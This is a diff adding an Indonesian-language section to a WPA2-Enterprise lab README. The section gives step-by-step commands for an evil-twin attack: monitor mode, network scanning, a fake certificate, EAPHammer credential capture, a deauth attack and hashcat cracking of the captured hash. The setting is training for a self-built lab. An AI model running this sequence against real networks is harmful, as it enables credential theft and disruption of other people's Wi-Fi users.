@@ -32,3 +32,50 @@ radtest juned juned123 127.0.0.1 1812 testing123
 ```
 sudo ./lab-wpa2-enterprise.sh
 ```
+
+## Jalankan Serangan
+
+#### 1. Aktifkan mode monitor:
+
+
+```
+sudo airmon-ng start wlan1
+```
+
+#### 2. Scan jaringan Wi-Fi WPA/WPA2:
+
+```
+sudo airodump-ng -t wpa wlan1mon
+```
+
+Cari jaringan Wi-Fi WPA/WPA2 dengan nilai `MGT` pada kolom `AUTH`.
+
+#### 3. Buat sertifikat palsu:
+
+```
+eaphammer --cert-wizard
+```
+
+#### 4. Jalankan EAPHammer:
+
+```
+eaphammer -i wlan1mon --channel [channel] --auth wpa-eap --essid [essid] --creds
+```
+
+#### 5. Set channel interface:
+
+```
+sudo airmon-ng start wlan1 [channel]
+```
+
+#### 6. Jalankan serangan deauth:
+
+```
+sudo aireplay-ng -0 10 -a [bssid] -c [mac_client] wlan1mon
+```
+
+#### 7. Crack hash:
+
+```
+hashcat -a 0 -m 5500 [file_hash] [file_wordlist]
+```
